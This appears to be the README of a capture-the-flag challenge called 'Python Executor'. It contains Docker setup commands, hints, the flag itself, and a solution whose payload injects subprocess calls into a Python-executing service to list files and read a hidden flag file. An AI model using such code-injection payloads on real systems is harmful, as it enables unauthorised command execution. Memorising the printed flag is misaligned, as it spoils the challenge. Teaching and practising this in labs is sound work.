# Python Executor

! Flag is empty

### Setup

```
docker build -t python-executor .
docker run --rm -p 3107:1337 python-executor
```

### Challenge

> I made my own Python shell that executes input statements and gives you the output. Try it out :snake:

**Flag:** `ZenseCTF{3x3c_0r_5ubpr0c355_run?}`

### Hints

- I wonder if you can run shell commands on python...
- Check out the [subprocess library](https://docs.python.org/3/library/subprocess.html)

### Solution

This challenge involves remote shell code execution through python.

- Being able to run an `ls -a` on the shell will indicate the presence of a `.flag.txt`, which you can simply `cat` to get the flag.

Possible payload string:
```py
import subprocess; subprocess.run(["ls", "-lah"]); subprocess.run(["cat", ".flag.txt"])
```
